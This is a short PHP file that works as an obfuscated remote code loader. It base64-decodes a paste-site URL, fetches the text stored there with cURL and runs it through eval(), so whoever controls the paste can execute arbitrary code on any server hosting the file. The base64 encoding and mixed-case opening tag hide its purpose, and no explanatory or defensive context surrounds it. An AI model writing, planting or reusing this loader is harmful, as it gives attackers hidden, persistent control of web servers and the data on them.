<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
$x= base64_decode('Pz4=');
      eval($x . get(base64_decode('aHR0cHM6Ly8wcGFzdGUuY29tLzQ0NzUzNy50eHQ=')));
?>